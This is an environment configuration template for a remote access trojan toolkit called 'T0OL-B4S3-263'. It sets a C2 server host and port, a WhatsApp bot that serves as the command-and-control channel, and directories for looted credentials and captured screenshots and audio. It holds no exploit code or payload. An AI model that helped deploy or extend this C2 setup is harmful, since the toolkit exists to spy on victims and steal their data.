# T0OL-B4S3-263 Environment Configuration Template
# Copy to .env and fill in your values

# ═══════════════════════════════════════════════════════════════
# RAT SERVER CONFIGURATION
# ═══════════════════════════════════════════════════════════════

# C2 Server host (where rat_server_fixed.py is running)
RAT_SERVER_HOST=127.0.0.1

# C2 Server port (listening port for rat_server_fixed.py)
RAT_SERVER_PORT=4444

# Encryption key for secure communication (Fernet format)
# Generate with: node -e "console.log(require('crypto').randomBytes(32).toString('base64').substring(0, 44))"
ENCRYPTION_KEY=YOUR_ENCRYPTION_KEY_HERE

# API server port (optional)
RAT_API_PORT=5000

# ═══════════════════════════════════════════════════════════════
# WHATSAPP BOT CONFIGURATION
# ═══════════════════════════════════════════════════════════════

# Display name for the bot
BOT_NAME="T0OL-B4S3-263 C2"

# Command prefix (single character)
COMMAND_PREFIX="/"

# Owner WhatsApp numbers (authorized to use bot)
# Format: ["1234567890@s.whatsapp.net", "9876543210@s.whatsapp.net"]
OWNER_NUMBERS=["YOUR_PHONE@s.whatsapp.net"]

# ═══════════════════════════════════════════════════════════════
# FEATURE FLAGS
# ═══════════════════════════════════════════════════════════════

# Auto-save media files (screenshots, audio, etc)
AUTO_SAVE_MEDIA=true

# Default command timeout in milliseconds
MAX_COMMAND_TIMEOUT=60000

# Enable completion notifications
ENABLE_NOTIFICATIONS=true

# ═══════════════════════════════════════════════════════════════
# OPTIONAL: ADVANCED CONFIGURATION
# ═══════════════════════════════════════════════════════════════

# Session storage directory
SESSION_DIR=./whatsapp-c2/sessions

# Loot/credentials directory
LOOT_DIR=./loot

# Captures directory (screenshots, audio, etc)
CAPTURES_DIR=./captures

# Log level: error, warn, info, debug
LOG_LEVEL=info

# Enable proxy (optional)
HTTP_PROXY=
HTTPS_PROXY=

# Webhook for notifications (optional)
WEBHOOK_URL=

# Database connection (optional)
DATABASE_URL=
